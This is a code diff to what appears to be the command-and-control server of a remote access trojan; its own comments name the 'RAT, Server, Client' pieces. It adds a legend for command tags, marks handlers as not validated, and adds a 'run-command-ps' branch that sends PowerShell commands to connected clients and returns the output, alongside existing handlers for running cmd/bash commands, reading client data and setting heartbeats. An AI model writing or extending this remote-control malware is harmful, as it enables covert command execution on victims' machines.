@@ -366,6 +366,18 @@ class ServerFriendlyClientHandler:
     #                                       Action       Value  Target Client 
     #requests/raw messages look like this: set-heartbeat 15 client_127_0_0_1_FCECW
 
+    ['## ==' tag meaning]:
+
+        Static: a set command or subset of commands: ie: get-data can only use stats, or connection
+            (aka rigid/less customizable)
+        Dynamic: a command that can take a wide range of values, ie: set-heartbeat X, X can be any number
+        
+        To client/from server: where the message/command is coming from/going to
+        
+        validated: command is in a working state accross all 3 pieces (RAT, Server, Client)
+        
+        [Windows only]/[Linux only]: commands that only work on windows/limux
+
     """
     def client_decision_tree(self, raw_message):
         logging.debug(f"[Client Decision Tree]: {raw_message}")
@@ -387,7 +399,7 @@ class ServerFriendlyClientHandler:
         else:
             logging.debug(f"[Server] Client {self.client} not found")
         
-        # == Static, From Server, validated
+        # == Static, From Server, not validated
         if client_command == "get-data":
             if client_command_value == "stats":
                 data = f"{self.client.data_list}"
@@ -400,7 +412,7 @@ class ServerFriendlyClientHandler:
             else:
                 self.send_msg("Not a valid data type")
 
-        # == Dynamic, To Client, validated
+        # == Dynamic, To Client, not validated [missing RAT side]
         elif client_command == "set-heartbeat":
             heartbeat_value = client_command_value
             logging.debug(f"[Server: Username] Setting Heartbeat of {heartbeat_value} for {self.client}")
@@ -416,11 +428,17 @@ class ServerFriendlyClientHandler:
                 self.send_msg(f"Error setting heartbeat for {self.client}")
                 logging.debug(f"Error setting heartbeat for {self.client}")   
         
-        # == Dynamic, To Client
+        # == Dynamic, To Client, not validated [missing RAT side]
+        ## cmd on win, bash on lin
         elif client_command == "run-command":
             ## Sending back results of command run
             self.send_msg(self.client.interact("run-command", client_command_value))
         
+        # [Windows only] # == Dynamic, To Client, not validated [missing RAT side]
+        elif client_command == "run-command-ps":
+            self.send_msg(self.client.interact("run-command-ps", client_command_value))
+
+
         ## stats on a per client basis
         elif client_command == "stats":
             pass
